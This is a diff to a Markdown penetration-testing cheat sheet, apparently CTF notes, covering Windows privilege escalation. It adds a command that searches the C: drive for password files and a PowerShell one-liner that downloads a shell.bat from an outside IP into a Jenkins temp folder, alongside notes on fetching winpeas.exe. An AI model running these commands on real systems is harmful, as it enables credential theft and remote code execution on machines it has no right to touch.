@@ -79,6 +79,7 @@ dir /R
 You can also search for passwords:
 
 ```powershell
+where /r c: *password*
 findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini
@@ -156,7 +157,7 @@ netsh firewall show config
 
 ## File Transfer
 
-### Transferring winpeas.exe
+### Powershell
 
 
 The following sequence of commands creates a PowerShell script named **wget.ps1** that performs the download of a file (**winpeas.exe**) from a specified URL (http://10.10.16.22/winpeas.exe) using the **System.Net.WebClient** class.
@@ -194,7 +195,12 @@ Now I have the file on the box:
 
 [Reference](https://d00mfist.gitbooks.io/ctf/content/transfering_files_to_windows.html)
 
-  
+### Powershell - 2
+
+```powershell
+powershell -c “(new-object System.Net.WebClient).DownloadFile(‘http://10.10.14.7:8000/shell.bat','C:\Users\Administrator\.jenkins\temp\shell.bat')"
+```
+
 
 ### impacket-smbserver
 
